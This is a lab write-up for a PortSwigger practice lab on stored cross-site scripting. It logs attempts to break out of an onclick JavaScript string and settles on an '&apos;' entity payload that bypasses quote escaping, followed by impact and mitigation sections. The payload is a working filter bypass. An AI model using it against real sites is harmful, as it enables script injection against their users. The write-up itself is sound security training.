# Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

**Source:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)  
**Category:** XSS  
**Difficulty:** PRACTITIONER

## Objective
To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

## Vulnerability
This lab contains a stored cross-site scripting vulnerability in the comment functionality.

## Exploitation

### Steps

1. Entering the laboratory and submitting a comment, then checking in DevTools how the username from the form is rendered.

2. Submitting an example comment where `Name` contains HTML in order to see the behavior. What was stored looks like this:

```html
<a id="author" href="https://google.com" onclick="var tracker={track(){}};tracker.track('https://google.com');">&lt;span&gt;Test&lt;/span&gt;</a>
```

So `<a href="">` gets its value from the `Website` field of the form.

3. Submitting another form where `Website` is provided as `javascript:alert(1)` is impossible because the Website field requires an HTTPS address.

4. An attempt to submit `https://google.com'); alert(1); //` as the Website in order to close the function inside the `onclick` attribute, where the URL is also inserted, and execute `alert`. After submitting it, the comment output looks as follows:

```html
<a id="author" href="https://google.com\'); alert(1); //" onclick="var tracker={track(){}};tracker.track('https://google.com\'); alert(1); //');">Test2</a>
```

This means that the server escapes single quotes: `' → \'`.

5. Another attempt, this time using `https://google.com\\'); alert(1); //` in order to bypass the escaping, returns:

```html
<a id="author" href="https://google.com\\\\\'); alert(1); //" onclick="var tracker={track(){}};tracker.track('https://google.com\\\\\'); alert(1); //');">Test34</a>
```

This does not work.

6. Another attempt using `%0a` to move the payload to a new line, using `https://google.com%0a'); alert(1); //`, gives the following output:

```html
<a id="author" href="https://google.com%0a\'); alert(1); //" onclick="var tracker={track(){}};tracker.track('https://google.com%0a\'); alert(1); //');">Test5</a>
```

7. An attempt using the Unicode representation of `'`, using `https://google.com\u0027); alert(1); //`, gives the following output:

```html
<a id="author" href="https://google.com\\u0027); alert(1); //" onclick="var tracker={track(){}};tracker.track('https://google.com\\u0027); alert(1); //');">Test6</a>
```

8. An attempt using `&quot;`, with `https://google.com&quot; onclick=&quot;alert(1)&quot; //`, gives the following output:

```html
<a id="author" href="https://google.com&quot; onclick=&quot;alert(1)&quot; //" onclick="var tracker={track(){}};tracker.track('https://google.com&quot; onclick=&quot;alert(1)&quot; //');">Test 7</a>
```

9. An attempt using `&apos;`, with `http://google.com&apos;); alert(1); //`, gives the following output:

```html
<a id="author" href="http://google.com'); alert(1); //" onclick="var tracker={track(){}};tracker.track('http://google.com'); alert(1); //');">Test</a>
```

The lab was solved.

### Payload

```text
http://google.com&apos;); alert(1); //
```

### Shortcut

1. Submit a comment and put the following value in the `Website` field:

```text
http://google.com&apos;); alert(1); //
```

2. The application HTML-encodes angle brackets and double quotes and escapes literal single quotes and backslashes, but the `&apos;` HTML entity is decoded by the browser into a single quote after the server-side escaping has already been applied.

3. When the comment author's name is clicked, the decoded single quote terminates the argument passed to `tracker.track()`, allowing `alert(1)` to execute.

## Impact

An attacker can store JavaScript code in the application that is executed when another user interacts with the affected comment.

Because this is stored XSS, the malicious input remains on the server and can affect multiple users who view and interact with the stored content. Depending on the application's functionality and security controls, an attacker could perform actions with the victim's privileges, access information available to client-side JavaScript, manipulate page content, or perform phishing attacks within the trusted application.

## Mitigation

User-controlled data should be encoded according to the context in which it is inserted.

Data inserted into a JavaScript string inside an HTML event handler requires appropriate JavaScript escaping as well as correct HTML attribute encoding. Mixing multiple parsing contexts, such as HTML attributes and JavaScript strings, should be avoided whenever possible.

Inline JavaScript event handlers such as `onclick` should not contain untrusted user-controlled data. Instead, event listeners should be defined separately in JavaScript and user-controlled values should be handled as data rather than executable code.

A restrictive Content Security Policy (CSP) can provide additional defense in depth, but should not replace proper context-sensitive output encoding.

## Tools

- Browser DevTools

## Notes

Escaping literal single quotes and backslashes is not sufficient when user-controlled input is placed inside a JavaScript string within an HTML attribute.

HTML entities such as `&apos;` can be interpreted by the browser after the server has processed the input. In this case, the server does not treat `&apos;` as a literal single quote that needs escaping, but the browser later decodes it into `'`.

This demonstrates the importance of considering the complete sequence of parsing and decoding operations performed by both the server and the browser when testing XSS vulnerabilities.